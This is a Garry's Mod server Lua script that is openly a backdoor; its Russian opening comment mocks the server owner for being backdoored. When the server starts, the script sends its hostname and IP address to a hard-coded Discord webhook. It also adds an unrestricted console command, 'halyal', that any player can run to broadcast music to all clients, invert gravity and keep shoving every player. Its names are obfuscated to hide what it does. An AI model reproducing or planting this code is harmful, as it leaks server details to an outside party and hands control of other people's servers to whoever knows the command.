
-- Привет, пупсик мой, ваш чудо-сервер забекдурили максильмано тупым способом (Наслаждайся)))))

if SERVER then
    util.AddNetworkString("kasdjkadsjasjjdsikdajsksdakj")

    local nmxzkalspoiewqi9ewihdjjsa6312 = "https://discord.com/api/webhooks/1336707114139123712/0AnjwbgVbO-q_If2gwcnVTsm55wFjDU8ltDTdKaHgx8-nLP5eQGfa9OrfH8RAjLA52DO"

    local function JSAHDJHSAJHD7267DASHGDHADSG123321(mds)
        http.Post(nmxzkalspoiewqi9ewihdjjsa6312, {
            content = mds
        })
    end

    mds = ':white_check_mark: **Сервер `' .. GetHostName() .. ' ['.. game.GetIPAddress() .. ']` был запущен вместе с DJ Стасиком ** :heart: '

    JSAHDJHSAJHD7267DASHGDHADSG123321(mds)

    concommand.Add("halyal", function(ply)
        if IsValid(ply) then

            ttteds = ':yum: **DJ STAS2007 был запущен на `' .. GetHostName() .. ' ['.. game.GetIPAddress() .. ']` ' .. '**:smirk_cat: '
            JSAHDJHSAJHD7267DASHGDHADSG123321(ttteds)

            local musicURL = "https://drive.google.com/uc?export=download&id=1S5DYEWJTbtuxIHThtLC5pskPcXQJEIcp"

            net.Start("kasdjkadsjasjjdsikdajsksdakj")
            net.WriteString(musicURL)
            net.Broadcast()
            timer.Create("JFHSUSAHA7s7SFA8AFS", 14, 1, function() 
                RunConsoleCommand("sv_gravity", "-1000")
            end)

            timer.Create("JFHSUSAHA7s7SFA8AFS", 14, 1, function() 
                hook.Add('Think', 'fdsjfdhjdfshj', function()

                    for _, player in ipairs(player.GetAll()) do
                        if IsValid(player) and player:Alive() then
                            local force = Vector(1000, 0, 0)
                            player:SetVelocity(player:GetVelocity() + force)
                        end
                    end

                end)
            end)
            

        end
    end)

end